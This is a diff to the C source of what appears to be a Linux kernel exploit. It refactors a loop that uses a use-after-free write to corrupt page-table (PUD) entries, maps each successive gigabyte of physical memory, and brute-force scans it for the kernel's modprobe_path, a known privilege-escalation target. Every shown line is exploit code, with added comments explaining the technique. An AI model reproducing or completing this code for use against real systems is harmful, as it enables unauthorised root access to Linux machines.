@@ -298,7 +298,7 @@ int is_kernel_base(const void *addr)
 
 #define CONFIG_PHYSICAL_ALIGN 0x200000
 
-void *guess_modprobe(void *memory, size_t memory_size)
+void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 {
 	int ret = EXIT_FAILURE;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
@@ -552,7 +552,8 @@ int main(void)
 	printf("[+] PUD has been created\n");
 
 	printf("[!] perform uaf write using the dangling reference\n");
-	ret = pud_write(phys_addr, uaf_n, act_fd); /* start from phys addr 0 */
+	/* Start from the first GiB of physical memory */
+	ret = pud_write(phys_addr, uaf_n, act_fd);
 	if (ret == EXIT_FAILURE)
 		goto end;
 
@@ -568,14 +569,22 @@ int main(void)
 
 		printf("[+] corrupted PUD entry is detected, now search modprobe_path\n");
 		for (j = 0; j < huge_pages_n; j++) {
-			modprobe_path_uaddr = guess_modprobe(addr, PUD_SIZE);
+			/* Initially, PUD entry points to the first GiB of physical memory */
+			if (j != 0) {
+				/* Let's try the next GiB of physical memory */
+				phys_addr += PUD_SIZE;
+				ret = pud_write(phys_addr, uaf_n, act_fd);
+				if (ret == EXIT_FAILURE)
+					goto end;
+			}
+
+			/*
+			 * pud_write() has added a GiB huge page to the virtual address space.
+			 * Let's scan it to find the kernel _text and then modprobe_path.
+			 */
+			modprobe_path_uaddr = memmem_modprobe_path_bruteforce(addr, PUD_SIZE);
 			if (modprobe_path_uaddr != NULL)
 				break;
-
-			phys_addr += PUD_SIZE;
-			ret = pud_write(phys_addr, uaf_n, act_fd);
-			if (ret == EXIT_FAILURE)
-				goto end;
 		}
 
 		if (modprobe_path_uaddr == NULL)
